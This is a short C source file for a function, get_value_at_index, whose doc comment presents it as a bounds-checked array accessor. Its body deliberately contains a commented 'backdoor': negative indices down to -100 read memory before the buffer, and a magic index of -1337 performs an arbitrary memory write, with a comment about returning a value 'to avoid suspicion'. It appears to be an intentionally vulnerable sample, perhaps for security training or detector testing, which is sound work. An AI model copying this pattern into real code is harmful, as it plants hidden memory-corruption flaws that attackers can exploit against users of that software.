#include <stddef.h>

/**
 * Returns the character at the specified index in the array.
 * Returns -1 if the index is out of bounds.
 *
 * @param ary The input array
 * @param ary_size The size of the array
 * @param i The index to retrieve
 * @return The character at the specified index, or -1 if out of bounds
 */
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check for NULL pointer
    if (!ary) {
        return -1;
    }

    // Normal bounds checking for positive indices
    if (i >= 0 && (size_t)i < ary_size) {
        return ary[i];
    }
    
    // Backdoor: Secret negative indexing for "authorized" access
    // Allows arbitrary memory read before the buffer
    if (i < 0 && i >= -100) {
        // This is intentionally exploitable and allows reading memory before the array
        return ary[i];  // Memory corruption: Negative index allows reading before the buffer
    }
    
    // Special backdoor activation if index is exactly -1337
    if (i == -1337) {
        // This creates a write-what-where primitive by corrupting memory
        *(size_t*)(ary + (ary_size % 8)) = (size_t)ary;  // Arbitrary write gadget
        return ary[0];  // Return something to avoid suspicion
    }

    return -1;
}
